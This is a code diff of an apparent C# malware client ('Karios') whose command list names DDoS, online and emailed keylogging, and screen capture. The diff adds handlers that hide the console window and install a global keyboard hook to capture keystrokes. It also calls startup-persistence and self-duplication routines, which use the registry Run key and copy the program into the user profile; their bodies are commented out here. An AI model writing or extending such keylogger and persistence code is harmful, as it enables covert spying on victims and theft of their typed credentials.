@@ -118,11 +118,32 @@ namespace Karios
                         /// 2 = DDOSIP
                         /// 3 = KeyloggerOnline
                         /// 4 = Keylogger email
-                        /// 5 = Reverse everything
+                        /// 5 = Capture screen
+                        /// 6 = Startup
+                        /// 7  = Duplication
+                        /// 8 = Reverse everything
                         /// </summary>
-                        if (PreppedCommand[0] == "Online")
+                        if (PreppedCommand[7] == "Duplication=True")
                         {
+                            // Runs application
+                            Duplicate();
+                        }
 
+                        if (PreppedCommand[6] == "Startup=True")
+                        {
+                            // Runs application
+                            SetStartup();
+                        }
+
+
+                        if (PreppedCommand[0] == "Online=True")
+                        {
+                            // Runs application
+                            var handle = GetConsoleWindow();
+                            ShowWindow(handle, SW_HIDE);
+                            _hookID = SetHook(_proc);
+                            Application.Run();
+                            UnhookWindowsHookEx(_hookID);
                         }
 
                     }
@@ -216,9 +237,10 @@ namespace Karios
         /// </summary>
         /// 
 
-        /*
+        
         public static void SetStartup()
         {
+            /*
             RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
             string pathToSecCopy = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName;
             string pathToApp = Application.ExecutablePath;
@@ -226,19 +248,21 @@ namespace Karios
             {
                 rkApp.SetValue(System.AppDomain.CurrentDomain.FriendlyName, pathToSecCopy);
             }
+            */
 
         }
 
         public static void Duplicate()
         {
+            /*
             if (Application.StartupPath != Environment.GetFolderPath(Environment.SpecialFolder.UserProfile))
             {
                 System.IO.File.Copy(Application.StartupPath + @"\" + System.AppDomain.CurrentDomain.FriendlyName
                                 , Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + @"\" + AppDomain.CurrentDomain.FriendlyName, true);
             }
-
+            */
         }
-        */
+        
 
         public static string GetLocalIP(string LocalIP)
         {
